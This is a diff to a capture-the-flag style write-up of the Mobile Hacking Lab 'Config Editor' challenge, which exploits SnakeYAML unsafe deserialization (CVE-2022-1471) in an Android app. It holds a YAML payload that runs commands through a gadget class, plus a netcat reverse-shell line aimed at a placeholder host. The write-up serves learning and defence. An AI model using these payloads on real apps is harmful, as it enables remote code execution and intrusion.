@@ -1,6 +1,8 @@
 # Mobile Hacking Lab - Lab Config Editor
 
-![Config Editor](../.res/2024-03-14-15-35-40.png)
+![Config Editor](../.res/2024-03-14-15-35-40.png)  
+
+- [Link to lab on Mobile Hackong Lab](https://www.mobilehackinglab.com/course/lab-config-editor-rce)
 
 ## Instructions
 
@@ -24,6 +26,10 @@ It seems to manipulate yaml files.
 If we try to load the provided file which is a yaml, we get this.  
 
 ![loaded yaml](../.res/2024-03-14-16-03-35.png)  
+
+> Note I got this in my local lab
+>
+> ![Loaded Yaml](../.res/2024-03-24-14-42-15.png)
 
 ### Analyze the source code
 
@@ -210,12 +216,29 @@ exploit:
 ["toybox nc IP PORT"]
 ```
 
-(little issue with the lab so I will finish this asap)
+> Note: If you are doing this on a local lab, check [this article for networking with your emulator on android.com](https://developer.android.com/studio/run/emulator-networking)
 
-# Coming soon 
+I am having an issue with netcat and can not get a proper shell.  
+
+Let's try to create a file with the exploit. Something like this in our yaml should work.  
+
+```yml
+exploit: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /data/data/com.mobilehackinglab.configeditor/files/exploit-proof.txt"]
+```
+
+And it does!  
+
+We load our malicious yaml  
+
+![load yaml](../.res/2024-03-24-15-04-20.png)  
+
+And in the shell from our emulator we can confirm that the file is created  
+
+![exploit proof created](../.res/2024-03-24-15-03-19.png)  
 
 ## Resources
 
 - [Resolving CVE-2022-1471  with the SnakeYAML 2.0 Release - Nova Trauben](https://www.veracode.com/blog/research/resolving-cve-2022-1471-snakeyaml-20-release-0)
 - [Unsafe deserialization vulnerability in SnakeYaml (CVE-2022-1471) - Brian Vermeer](https://snyk.io/fr/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/)
 - [Constructing a malicious YAML file for SnakeYAML (CVE-2022-1471) - mscharhag](https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471)
+- [Emulator networking on Android studio](https://developer.android.com/studio/run/emulator-networking)
